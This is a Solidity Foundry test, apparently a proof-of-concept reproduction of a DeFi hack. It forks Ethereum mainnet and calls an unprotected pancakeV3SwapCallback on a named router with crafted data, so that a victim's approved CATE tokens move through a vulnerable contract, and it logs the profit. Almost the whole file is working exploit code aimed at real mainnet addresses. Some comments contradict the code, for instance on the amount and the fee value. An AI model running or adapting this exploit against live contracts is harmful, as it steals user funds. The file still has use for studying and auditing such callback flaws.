// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import "./test/interfaces/IERC20.sol";

interface Ibanarouter {
    function pancakeV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes memory data) external;
}

contract XXXExploit is Test {

    // Address of the victim contract
    Ibanarouter router = Ibanarouter(0x3328F7f4A1D1C57c35df56bBf0c9dCAFCA309C49);
    address private constant vic = address(0x7Ab80c5AE65D9d7E3d805873E2B91c2145296e3A);
    address private constant ETH_ADDRESS = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);
    IERC20 cate = IERC20(0xa00453052A36D43A99Ac1ca145DFe4A952cA33B8);
    address private vuln = 0xC465CC50B7D5A29b9308968f870a4B242A8e1873;

    // Fork Ethereum mainnet at a specific block to simulate conditions
    function setUp() public {
        // Forking Ethereum mainnet using a public RPC and a specific block
        vm.createSelectFork("https://rpc.ankr.com/eth", 20771178);
        deal(address(this), 1.0 ether);
    }

    // The main exploit test case
    function testExploit() public {

      emit log_named_decimal_uint("profit = ", address(this).balance, 18);
        // Get the allowance of the victim (vic) to the vuln contract
      uint256 allowance = cate.allowance(vic, vuln);

        // Get the balance of the victim (vic)
      uint256 balance = cate.balanceOf(vic);

        // Compare the balance with the allowance, and set the amount to transfer accordingly
      uint256 amountToTransfer = balance < allowance ? balance : allowance;

        // Log the information for debugging
      emit log_named_decimal_uint("Allowance = ", allowance, 18);
      emit log_named_decimal_uint("Balance = ", balance, 18);
      emit log_named_decimal_uint("Amount to Transfer = ", amountToTransfer, 18);
        
      uint256 fee1 = 3_000;
      uint256 fee2 = 10_000;

        // Encode the data for the pancakeV3SwapCallback
      bytes memory data = abi.encode(
          cate,
          vic,
          0,
          ETH_ADDRESS,
          address(vuln),
          amountToTransfer,
          fee1,
          fee2
        );

        // Call the vulnerable function in the victim contract
        Ibanarouter(router).pancakeV3SwapCallback(
            1 ether,  // amount0Delta (13.310336193126115279 ETH in wei)
            1 ether,  // amount1Delta (same amount for symmetry)
            data  // Payload data
        );

        // Log the profit, assuming it's in Ether (use address(this).balance for Ether balance)
        emit log_named_decimal_uint("profit = ", address(this).balance, 18);
    }

    function fee() external pure returns (uint256) {
        // Return the fee value of 3,000
        return 0;
    }

    // Fallback function to receive Ether
    receive() external payable {}
}
